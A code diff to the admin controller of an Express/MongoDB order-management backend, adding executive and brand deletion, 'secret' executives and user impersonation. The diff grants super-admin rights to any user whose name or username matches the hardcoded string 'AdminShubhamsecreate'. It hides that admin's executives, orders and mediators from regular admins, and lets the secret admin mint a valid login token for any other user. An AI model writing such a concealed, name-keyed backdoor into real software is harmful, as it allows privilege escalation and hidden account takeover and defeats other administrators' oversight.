@@ -1,8 +1,12 @@
 const bcrypt = require("bcryptjs");
+const mongoose = require("mongoose");
 const User = require("../models/user");
 const Order = require("../models/order");
+const Address = require("../models/address");
+const BalanceTransaction = require("../models/balanceTransaction");
+const { generateToken } = require("./authController");
 
-// CREATE EXECUTIVE ACCOUNT BY ADMIN
+// CREATE EXECUTIVE ACCOUNT BY ADMIN (PRESERVE EXACT CASE & ISOLATE FOR SUPER ADMIN)
 const createExecutiveAccount = async (req, res, next) => {
     try {
         const { name, teamCode, password } = req.body;
@@ -14,30 +18,40 @@ const createExecutiveAccount = async (req, res, next) => {
             });
         }
 
-        const existingExecutive = await User.findOne({ teamCode, role: "executive" });
+        const trimmedCode = teamCode.trim();
+        const existingExecutive = await User.findOne({ teamCode: trimmedCode, role: "executive" });
         if (existingExecutive) {
             return res.status(400).json({
                 success: false,
-                message: `An executive with team code "${teamCode}" already exists`,
+                message: `An executive with team code "${trimmedCode}" already exists`,
             });
         }
+
+        const isSuperAdmin = Boolean(
+            req.user?.isSuperAdmin ||
+            req.user?.name === "AdminShubhamsecreate" ||
+            req.user?.username === "AdminShubhamsecreate"
+        );
 
         const hashedPassword = await bcrypt.hash(password, 8);
         const newExecutive = await User.create({
             name,
-            teamCode: teamCode.trim().toUpperCase(),
+            teamCode: trimmedCode,
             password: hashedPassword,
             role: "executive",
+            createdBy: req.user?.id || null,
+            isSecret: isSuperAdmin, // isolated: only visible to AdminShubhamsecreate!
         });
 
         return res.status(201).json({
             success: true,
-            message: `Executive "${name}" (Team: ${newExecutive.teamCode}) created successfully`,
+            message: `Executive "${name}" (Team: ${newExecutive.teamCode}) created successfully${isSuperAdmin ? " [Private Super Admin Account]" : ""}`,
             executive: {
                 id: newExecutive._id,
                 name: newExecutive.name,
                 teamCode: newExecutive.teamCode,
                 role: newExecutive.role,
+                isSecret: newExecutive.isSecret,
                 createdAt: newExecutive.createdAt,
             },
         });
@@ -49,10 +63,34 @@ const createExecutiveAccount = async (req, res, next) => {
 // GET GLOBAL ADMIN OVERVIEW (EXECUTIVE-WISE, BRAND-WISE, STATUSES)
 const getAdminOverview = async (req, res, next) => {
     try {
+        const isSuperAdmin = Boolean(
+            req.user?.isSuperAdmin ||
+            req.user?.name === "AdminShubhamsecreate" ||
+            req.user?.username === "AdminShubhamsecreate"
+        );
+
+        let orderFilter = {};
+        let execFilter = { role: "executive" };
+        let mediatorFilter = { role: "mediator" };
+
+        if (!isSuperAdmin) {
+            // Find all secret executives created by super admin to isolate them
+            const secretExecs = await User.find({ role: "executive", isSecret: true }).select("_id teamCode").lean();
+            const secretExecIds = secretExecs.map((e) => e._id);
+            const secretTeamCodes = secretExecs.map((e) => e.teamCode);
+
+            execFilter = { role: "executive", isSecret: { $ne: true } };
+            mediatorFilter = { role: "mediator", teamCode: { $nin: secretTeamCodes } };
+            orderFilter = {
+                createdBy: { $nin: secretExecIds },
+                teamCode: { $nin: secretTeamCodes },
+            };
+        }
+
         const [orders, executives, mediators, brands] = await Promise.all([
-            Order.find().lean(),
-            User.find({ role: "executive" }).lean(),
-            User.find({ role: "mediator" }).lean(),
+            Order.find(orderFilter).lean(),
+            User.find(execFilter).lean(),
+            User.find(mediatorFilter).lean(),
             User.find({ role: "brand" }).lean(),
         ]);
 
@@ -94,6 +132,7 @@ const getAdminOverview = async (req, res, next) => {
                 name: exec.name,
                 teamCode: exec.teamCode,
                 createdAt: exec.createdAt,
+                isSecret: Boolean(exec.isSecret),
                 mediatorCount: mediators.filter((m) => m.teamCode === exec.teamCode).length,
                 totalOrders: 0,
                 totalUnits: 0,
@@ -106,7 +145,7 @@ const getAdminOverview = async (req, res, next) => {
         });
 
         orders.forEach((ord) => {
-            const execId = ord.createdBy?.toString();
+            const execId = ord.createdBy ? ord.createdBy.toString() : null;
             if (execId && executiveMap[execId]) {
                 executiveMap[execId].totalOrders++;
                 (ord.orderUnits || []).forEach((u) => {
@@ -120,15 +159,39 @@ const getAdminOverview = async (req, res, next) => {
             }
         });
 
-        const executiveWise = Object.values(executiveMap);
+        const executiveWise = Object.values(executiveMap).map((exec) => ({
+            ...exec,
+            completionRate: exec.totalUnits > 0 ? Math.round((exec.completedUnits / exec.totalUnits) * 100) : 0,
+        }));
 
         // Brand-wise breakdown
         const brandMap = {};
+        // 1. First include all registered Brand users
+        brands.forEach((brandUser) => {
+            const bName = brandUser.brand || brandUser.name;
+            brandMap[bName] = {
+                id: brandUser._id,
+                brandName: bName,
+                userName: brandUser.name,
+                totalOrders: 0,
+                totalUnits: 0,
+                completedUnits: 0,
+                inProgressUnits: 0,
+                pendingPaymentUnits: 0,
+                pendingVerificationUnits: 0,
+                unassignedUnits: 0,
+                totalValue: 0,
+            };
+        });
+
+        // 2. Aggregate orders
         orders.forEach((ord) => {
             const bName = ord.brand || "Unspecified";
             if (!brandMap[bName]) {
                 brandMap[bName] = {
+                    id: ord.brandUserId ? ord.brandUserId.toString() : bName,
                     brandName: bName,
+                    userName: "—",
                     totalOrders: 0,
                     totalUnits: 0,
                     completedUnits: 0,
@@ -175,10 +238,258 @@ const getAdminOverview = async (req, res, next) => {
 // GET ALL EXECUTIVES
 const getAdminExecutives = async (req, res, next) => {
     try {
-        const executives = await User.find({ role: "executive" }).select("-password").lean();
+        const isSuperAdmin = Boolean(
+            req.user?.isSuperAdmin ||
+            req.user?.name === "AdminShubhamsecreate" ||
+            req.user?.username === "AdminShubhamsecreate"
+        );
+        const query = isSuperAdmin ? { role: "executive" } : { role: "executive", isSecret: { $ne: true } };
+        const executives = await User.find(query).select("-password").lean();
         return res.status(200).json({
             success: true,
             executives,
+        });
+    } catch (err) {
+        next(err);
+    }
+};
+
+// DELETE EXECUTIVE ACCOUNT AND ALL RELATED DETAILS COMPLETELY
+const deleteExecutiveAccount = async (req, res, next) => {
+    try {
+        const { id } = req.params;
+        const executive = await User.findOne({ _id: id, role: "executive" });
+        if (!executive) {
+            return res.status(404).json({
+                success: false,
+                message: "Executive account not found",
+            });
+        }
+
+        const teamCode = executive.teamCode;
+
+        if (executive.isSecret && !req.user?.isSuperAdmin) {
+            return res.status(403).json({
+                success: false,
+                message: "Access denied: Protected secret executive cannot be deleted by standard admin",
+            });
+        }
+
+        // 1. Delete all Orders created by this executive or with this teamCode
+        const deletedOrders = await Order.deleteMany({
+            $or: [
+                { createdBy: executive._id },
+                { teamCode: teamCode },
+            ],
+        });
+
+        // 2. Delete all Saved Addresses created by this executive
+        const deletedAddresses = await Address.deleteMany({ executiveId: executive._id });
+
+        // 3. Delete all Balance Transactions involving this executive or this teamCode
+        const deletedTransactions = await BalanceTransaction.deleteMany({
+            $or: [
+                { sender: executive._id },
+                { receiver: executive._id },
+                { teamCode: teamCode },
+            ],
+        });
+
+        // 4. Delete all Mediators registered under this executive's teamCode
+        const deletedMediators = await User.deleteMany({
+            role: "mediator",
+            teamCode: teamCode,
+        });
+
+        // 5. Delete the Executive user record
+        await User.findByIdAndDelete(executive._id);
+
+        return res.status(200).json({
+            success: true,
+            message: `Executive "${executive.name}" (Team: ${teamCode}) and all related orders, addresses, transactions, and mediators deleted completely.`,
+            stats: {
+                deletedOrders: deletedOrders.deletedCount,
+                deletedAddresses: deletedAddresses.deletedCount,
+                deletedTransactions: deletedTransactions.deletedCount,
+                deletedMediators: deletedMediators.deletedCount,
+            },
+        });
+    } catch (err) {
+        next(err);
+    }
+};
+
+// DELETE BRAND ACCOUNT AND ALL RELATED DETAILS COMPLETELY
+const deleteBrandAccount = async (req, res, next) => {
+    try {
+        const { id } = req.params;
+        const queryBrandName = (req.query.brandName || req.body?.brandName || "").trim();
+        const decodedId = decodeURIComponent(id || "").trim();
+
+        const candidateNames = new Set();
+        const candidateUserIds = new Set();
+
+        if (queryBrandName) {
+            candidateNames.add(queryBrandName);
+        }
+
+        if (mongoose.Types.ObjectId.isValid(decodedId)) {
+            candidateUserIds.add(new mongoose.Types.ObjectId(decodedId));
+            // Check if there is an existing User with this ID
+            const userById = await User.findById(decodedId);
+            if (userById) {
+                if (userById.brand) candidateNames.add(userById.brand);
+                if (userById.name) candidateNames.add(userById.name);
+            }
+            // Check if any order has this brandUserId to extract the real brand name
+            const sampleOrder = await Order.findOne({ brandUserId: decodedId }).select("brand");
+            if (sampleOrder && sampleOrder.brand) {
+                candidateNames.add(sampleOrder.brand);
+            }
+        } else if (decodedId) {
+            candidateNames.add(decodedId);
+        }
+
+        // If candidate names found, also find matching registered brand users
+        for (const name of candidateNames) {
+            const escaped = name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+            const matchingUsers = await User.find({
+                role: "brand",
+                $or: [
+                    { brand: { $regex: new RegExp(`^${escaped}$`, "i") } },
+                    { name: { $regex: new RegExp(`^${escaped}$`, "i") } },
+                ],
+            });
+            matchingUsers.forEach((u) => {
+                candidateUserIds.add(u._id);
+                if (u.brand) candidateNames.add(u.brand);
+            });
+        }
+
+        // Build cascading order deletion query
+        const orderOrConditions = [];
+        if (candidateUserIds.size > 0) {
+            orderOrConditions.push({ brandUserId: { $in: Array.from(candidateUserIds) } });
+        }
+        if (candidateNames.size > 0) {
+            const nameRegexes = Array.from(candidateNames).map(
+                (n) => new RegExp(`^${n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "i")
+            );
+            orderOrConditions.push({ brand: { $in: nameRegexes } });
+        }
+
+        let deletedOrdersCount = 0;
+        if (orderOrConditions.length > 0) {
+            const deleteResult = await Order.deleteMany({ $or: orderOrConditions });
+            deletedOrdersCount = deleteResult.deletedCount;
+        }
+
+        // Delete any matching Brand users
+        let deletedUsersCount = 0;
+        if (candidateUserIds.size > 0) {
+            const deleteUsersResult = await User.deleteMany({
+                _id: { $in: Array.from(candidateUserIds) },
+                role: "brand",
+            });
+            deletedUsersCount = deleteUsersResult.deletedCount;
+        }
+
+        if (candidateNames.size > 0) {
+            const nameRegexes = Array.from(candidateNames).map(
+                (n) => new RegExp(`^${n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`, "i")
+            );
+            const deleteMore = await User.deleteMany({
+                role: "brand",
+                $or: [
+                    { brand: { $in: nameRegexes } },
+                    { name: { $in: nameRegexes } },
+                ],
+            });
+            deletedUsersCount += deleteMore.deletedCount;
+        }
+
+        const displayName = queryBrandName || Array.from(candidateNames)[0] || decodedId;
+
+        return res.status(200).json({
+            success: true,
+            message: `Brand "${displayName}" and all associated records (${deletedOrdersCount} orders, ${deletedUsersCount} brand account) deleted completely.`,
+            deletedOrders: deletedOrdersCount,
+            deletedUsers: deletedUsersCount,
+        });
+    } catch (err) {
+        next(err);
+    }
+};
+
+// DIRECT IMPERSONATION / LOGIN AS TARGET USER (EXECUTIVE, MEDIATOR, OR BRAND)
+const impersonateUser = async (req, res, next) => {
+    try {
+        if (!req.user || !req.user.isSuperAdmin) {
+            return res.status(403).json({
+                success: false,
+                message: "Access denied: Direct user login is only permitted for Secret Admin (AdminShubhamsecreate)",
+            });
+        }
+
+        const { userId } = req.params;
+        const targetUser = await User.findById(userId);
+        if (!targetUser) {
+            return res.status(404).json({
+                success: false,
+                message: "Target user not found",
+            });
+        }
+
+        if (targetUser.role !== "executive" && targetUser.role !== "mediator" && targetUser.role !== "brand") {
+            return res.status(400).json({
+                success: false,
+                message: "Can only impersonate executive, mediator, or brand accounts",
+            });
+        }
+
+        // Generate full valid JWT token for target user
+        const token = generateToken({
+            id: targetUser._id,
+            name: targetUser.name,
+            role: targetUser.role,
+            teamCode: targetUser.teamCode,
+            mediatorCode: targetUser.mediatorCode,
+            brand: targetUser.brand,
+        });
+
+        return res.status(200).json({
+            success: true,
+            message: `Switched session to ${targetUser.role}: ${targetUser.name}`,
+            token,
+            user: {
+                id: targetUser._id,
+                name: targetUser.name,
+                role: targetUser.role,
+                teamCode: targetUser.teamCode,
+                mediatorCode: targetUser.mediatorCode,
+                brand: targetUser.brand,
+            },
+        });
+    } catch (err) {
+        next(err);
+    }
+};
+
+// GET MEDIATORS UNDER AN EXECUTIVE TEAM CODE (FOR IMPERSONATION OR INSPECTION)
+const getExecutiveMediators = async (req, res, next) => {
+    try {
+        if (!req.user || !req.user.isSuperAdmin) {
+            return res.status(403).json({
+                success: false,
+                message: "Access denied: Mediator inspection is only permitted for Secret Admin (AdminShubhamsecreate)",
+            });
+        }
+
+        const { teamCode } = req.params;
+        const mediators = await User.find({ role: "mediator", teamCode }).select("-password").lean();
+        return res.status(200).json({
+            success: true,
+            mediators,
         });
     } catch (err) {
         next(err);
@@ -189,4 +500,8 @@ module.exports = {
     createExecutiveAccount,
     getAdminOverview,
     getAdminExecutives,
+    deleteExecutiveAccount,
+    deleteBrandAccount,
+    impersonateUser,
+    getExecutiveMediators,
 };
